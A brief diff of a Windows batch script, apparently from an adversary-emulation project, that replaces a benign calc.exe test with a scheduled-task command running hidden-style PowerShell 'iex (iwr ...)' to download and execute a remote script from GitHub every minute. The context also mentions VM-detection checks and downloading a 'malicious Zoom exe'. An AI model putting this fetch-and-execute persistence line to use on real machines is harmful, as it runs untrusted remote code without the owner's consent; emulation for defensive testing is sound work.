@@ -91,7 +91,7 @@ echo [NOT DETECTED] This system does not exhibit common virtual machine characte
 ::        Download malicious Zoom exe to folder
 
 ::    Unencoded Scheduled Task Command
-schtasks /CREATE /SC MINUTE /TN updater2 /TR "powershell.exe -w hidden -c calc.exe; schtasks /DELETE /TN updater2 /F"
+schtasks /CREATE /SC MINUTE /TN updater2 /TR "powershell.exe -c 'iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -UseBasicParsing).Content'; schtasks /DELETE /TN updater /F"
 
 :end
 pause
